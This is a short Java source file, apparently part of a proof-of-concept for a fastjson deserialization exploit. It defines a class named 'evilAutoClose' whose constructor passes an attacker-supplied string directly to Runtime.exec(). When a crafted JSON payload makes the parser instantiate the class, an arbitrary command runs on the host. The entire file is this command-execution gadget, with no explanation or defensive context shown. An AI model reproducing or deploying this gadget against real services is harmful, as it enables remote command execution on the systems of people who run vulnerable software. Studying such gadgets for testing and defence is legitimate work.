package fastjson;

import java.io.IOException;

public class evilAutoClose implements AutoCloseable {
    public evilAutoClose(String cmd) throws IOException {
        Runtime.getRuntime().exec(cmd);
    }

    @Override
    public void close() throws Exception {

    }
}
